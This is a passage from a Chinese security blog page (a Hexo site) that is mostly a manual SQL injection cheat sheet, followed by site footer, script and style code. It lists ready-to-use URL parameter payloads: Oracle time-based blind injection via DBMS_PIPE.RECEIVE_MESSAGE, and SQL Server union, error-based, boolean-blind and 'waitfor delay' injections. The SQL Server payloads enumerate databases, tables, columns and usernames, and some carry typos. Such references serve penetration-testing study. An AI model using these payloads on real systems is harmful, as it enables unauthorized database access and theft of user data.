+<p>可使用DBMS_PIPE.RECEIVE_MESSAGE(‘任意值’,延迟时间)函数进行时间盲注，这个函数可以指定延迟的时间</p>
+<pre><code>?id=1&#39; and 1=(case when ascii(substr(user,1,1))&gt; 128 then DBMS_PIPE.RECEIVE_MESSAGE(&#39;a&#39;,5) else 1 end)--
+?id=1&#39; and 1=(case when ascii(substr(user,1,1))&gt; 64 then DBMS_PIPE.RECEIVE_MESSAGE(&#39;a&#39;,5) else 1 end)--
+</code></pre>
+<h2 id="0x03-SQL-server-手工注入"><a href="#0x03-SQL-server-手工注入" class="headerlink" title="0x03 SQL server 手工注入"></a>0x03 SQL server 手工注入</h2><h3 id="3-1-联合注入"><a href="#3-1-联合注入" class="headerlink" title="3.1 联合注入"></a>3.1 联合注入</h3><pre><code>?id=-1&#39; union select null,null--?
+id=-1&#39; union select @@servername, @@version--
+?id=-1&#39; union select db_name(),suser_sname()--
+?id=-1&#39; union select (select top 1 name from sys.databases where name not in (select top 6 name from sys.databases)),null--
+?id=-1&#39; union select (select top 1 name from sys.databases where name not in (select top 7 name from sys.databasesl),null--
+?id--1&#39; union select (select top 1 table_ name from information_schema.tables where table_name not in (select top 0 table_name from information_schema.tables)),null--
+?id=-1&#39; union select (select top 1 column name from information_schema.columns where table_name=&#39;users&#39; and column_name not in (select top 1 column_name from information_schema.columns where table_name = &#39;users&#39;)),null---
+?id=-1&#39; union select (select top 1 username from users where username not in (select top 3 username from users)),null--
+</code></pre>
+<h3 id="3-2-报错注入"><a href="#3-2-报错注入" class="headerlink" title="3.2 报错注入"></a>3.2 报错注入</h3><pre><code>?id=1&#39; and 1=(select 1/@@servername)--
+?id=1&#39; and 1=(select 1/(select top 1 name from sys.databases where name not in (select top 1 name from sys.databases))--
+</code></pre>
+<h3 id="3-3-盲注"><a href="#3-3-盲注" class="headerlink" title="3.3 盲注"></a>3.3 盲注</h3><h4 id="3-3-1-布尔盲注"><a href="#3-3-1-布尔盲注" class="headerlink" title="3.3.1 布尔盲注"></a>3.3.1 布尔盲注</h4><pre><code>?id=1&#39; and ascii(substring((select db_ name(1)),1,1))&gt; 64--
+</code></pre>
+<h4 id="3-3-2-时间盲注"><a href="#3-3-2-时间盲注" class="headerlink" title="3.3.2 时间盲注"></a>3.3.2 时间盲注</h4><pre><code>?id= 1&#39;;if(2&gt;1) waitfor delay &#39;0:0:5&#39;--
+?id= 1&#39;;if(ASCII(SUBSTRING((select db_name(1)),1,1))&gt; 64) waitfor delay &#39;0:0:2&#39;--
+</code></pre>
+<blockquote>
+<p><strong>原文链接：乌云安全</strong></p>
+</blockquote>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达 </span>
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2020-2021 Alex
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
